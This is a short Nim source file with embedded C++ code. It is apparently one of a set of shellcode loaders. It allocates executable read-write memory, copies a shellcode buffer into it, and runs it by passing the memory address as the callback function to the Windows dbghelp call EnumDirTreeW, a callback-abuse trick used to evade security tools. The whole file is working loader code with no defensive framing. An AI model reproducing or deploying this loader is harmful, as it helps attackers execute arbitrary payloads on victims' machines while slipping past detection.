{.passL:"-l Dbghelp".}
import public

{.emit: """
#include <windows.h>
#include <stdio.h>

typedef BOOL
(CALLBACK* PENUMDIRTREE_CALLBACKW)(
    PCWSTR FilePath,
    PVOID CallerData);

typedef BOOL (WINAPI* EnumDir)(HANDLE hProcess,
    PCWSTR RootPath,
    PCWSTR InputPathName,
    PWSTR OutputPathBuffer,
    PENUMDIRTREE_CALLBACKW cb,
    PVOID data);

typedef BOOL(WINAPI* Sysinit)(
    HANDLE hProcess,
    PCSTR UserSearchPath,
    BOOL fInvadeProcess);
    
int EnumDirTreeWNim(char *shellcode,SIZE_T shellcodeSize) {
    HMODULE dbgaddr = LoadLibrary("dbghelp.dll");
    EnumDir enumdirfunc = (EnumDir)GetProcAddress(dbgaddr, "EnumDirTreeW");
    Sysinit sysinitfunc = (Sysinit)GetProcAddress(dbgaddr, "SymInitialize");
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);
    sysinitfunc(::GetCurrentProcess(), NULL, TRUE);
    WCHAR dummy[522];
    enumdirfunc(::GetCurrentProcess(), L"C:\\Windows", L"*.log", dummy, (PENUMDIRTREE_CALLBACKW)addr, NULL);
}
"""
.}

proc EnumDirTreeWNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumDirTreeWNim(@)",nodecl.}

discard EnumDirTreeWNim(code,codelen)